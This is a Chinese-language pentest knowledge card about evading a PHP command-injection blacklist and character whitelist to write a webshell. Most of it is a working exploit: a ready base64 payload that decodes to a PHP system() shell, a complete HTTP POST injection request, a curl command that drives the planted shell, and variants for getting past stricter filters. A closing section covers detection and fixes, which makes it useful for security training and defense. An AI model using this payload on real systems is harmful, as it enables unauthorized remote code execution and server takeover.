---
id: web-php-rce-command-injection-blacklist-base64-tee-webshell
title: 命令注入黑名单 + 字符集白名单绕过：base64 -d | tee 写 WebShell
type: scenario
domain: web
path: web/php/rce
technique: command-injection-blacklist-charset-base64-tee
tags:
- web
- php
- command-injection
- blacklist-bypass
- base64
- tee
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V81
  verified_at: '2026-11-05T17:48:09+08:00'
  notes: 已对照原文 Casa Paco 源码：黑名单 /\b(whoami|ls|pwd|cat|sh|bash)\b/i、白名单 /^[a-zA-Z0-9\s$\(\)\-\_\.\|]*$/、shell_exec 直接拼接；卡片 base64 串仅字母数字且无填充，实解码为 <?php system($_POST[0]);?> 加末尾空格，整条命令落在白名单内且不命中黑名单；未实测。
url: /docs/web/php/rce/web-php-rce-command-injection-blacklist-base64-tee-webshell/
draft: false
kb_aliases:
- PHP shell_exec 黑名单绕过
- 命令注入字符集绕过
- base64 tee 写 webshell
- 无引号无斜杠命令注入
- 黑名单命令注入
---

## 一句话结论

PHP 把用户输入直接拼进 `shell_exec()`，即使加了 `whoami|ls|pwd|cat|sh|bash` 黑名单和 `[a-zA-Z0-9\s$()\-_.|]` 字符集白名单，攻击者仍可用 `echo <base64>|base64 -d|tee shell.php` 写入任意 PHP WebShell；该命令不含引号、斜杠和黑名单词，完全落在允许字符集内。

## 原理

- `shell_exec("$dish")` 未用 `escapeshellarg()`，用户输入可拼接任意 shell 语法；黑名单只拦常见“读命令/起 shell”词（`whoami`、`ls`、`pwd`、`cat`、`sh`、`bash`），白名单只允许字母数字、空白、`$()`、`-`、`_`、`.`、`|`。
- 白名单看似严格，但仍允许 `|`（管道）、`$()`（命令替换）、`-`（参数）、`.`（文件名）、空白；这足以组合出写文件的原语：`echo <payload> | base64 -d | tee shell.php`。
- `echo`、`base64`、`tee` 都不是黑名单词；base64 字符串只含字母数字（选择无 `+`、`/`、`=` 的编码，例如给 PHP 源码末尾补一个空格使长度成为 3 的倍数），因此不触发字符集检查。
- `base64 -d` 把文本解码为 PHP 代码，`tee shell.php` 同时写入文件并输出；Web 目录可写时，访问 `shell.php` 即可执行命令。
- 即使 `shell_exec` 没有回显，`tee` 的写入和后续访问也能确认成功；黑名单/白名单只做“词表匹配”，没有解析 shell 语法，无法阻止管道与重定向组合。

## 触发条件

- 用户输入进入 `shell_exec`/`system`/`exec`/反引号等 shell 执行函数；
- 存在黑名单/字符集白名单，但允许 `|`、`$()`、`.`、`-`、空白等组合字符；
- Web 目录可写，或有其他可写路径能被 Web 访问/包含；
- 攻击者能访问写入的 WebShell。

## 利用步骤

1. 确认注入点与过滤规则：提交 `1'`、`;id`、`|id` 等观察回显/报错；源码泄露时直接读取黑名单与白名单。
2. 选择不含黑名单词、只含允许字符的写文件命令：
   ```bash
   echo PD9waHAgc3lzdGVtKCRfUE9TVFswXSk7Pz4g | base64 -d | tee shell.php
   ```
   其中 base64 解码为 `<?php system($_POST[0]);?> `。
3. 提交后访问 `shell.php`，用 POST 参数 `0=<command>` 执行命令。
4. 用 WebShell 反弹 Shell 或继续写文件；若目标有 disable_functions，改用其他写文件/包含技巧。
5. 清理写入的文件（授权测试时）。

## PoC

```text
# 注入的 dish 参数（只含字母数字、空格、|、-、.）
echo PD9waHAgc3lzdGVtKCRfUE9TVFswXSk7Pz4g | base64 -d | tee shell.php

# 解码结果（末尾空格用于让 base64 无 = 填充）
<?php system($_POST[0]);?>
```

```http
POST /order.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

name=test&dish=echo+PD9waHAgc3lzdGVtKCRfUE9TVFswXSk7Pz4g+|+base64+-d+|+tee+shell.php
```

```bash
# 访问写入的 WebShell
curl -X POST --data "0=id" http://target/shell.php
```

## 变体与关联

- 变体：若 `tee` 被拦，用 `cp`/`mv`/`dd`/`sed` 等允许命令；若 `base64` 被拦，用 `xxd -r`、`printf`、`$'\x..'`（视字符集）等。
- 变体：白名单允许 `$()` 时，可用 `$(printf ...)` 或命令替换拼接黑名单词（如 `$(echo c)at`）。
- 关联：[[web-php-file-inclusion-filter-chain-fileless-rce]]（无文件写 WebShell）、[[web-php-rce-disable-functions-ld-preload]]（disable_functions 绕过）、[[pentest-privilege-escalation-cron-writable-script]]（写文件后配合定时任务提权）。
- 边界：输入被 `escapeshellarg`/参数化、白名单严格到只允许单个命令和固定参数、Web 目录不可写时，本路径不成立。

## 检测与防御

- 修复：不要拼接 shell 命令；使用参数化 API（如 `proc_open` 数组形式）或内置功能替代；必须拼接时用 `escapeshellarg()`/`escapeshellcmd()` 并做业务白名单。
- 加固：禁用 `shell_exec`/`system`/`exec` 等危险函数；Web 目录不可写；上传/写入目录不解析 PHP。
- 检测：请求参数中出现 `|`、`$(`、`base64 -d`、`tee`、`echo` 等组合；Web 目录出现新建 PHP 文件；`www-data` 进程派生 `tee`/`base64` 行为。
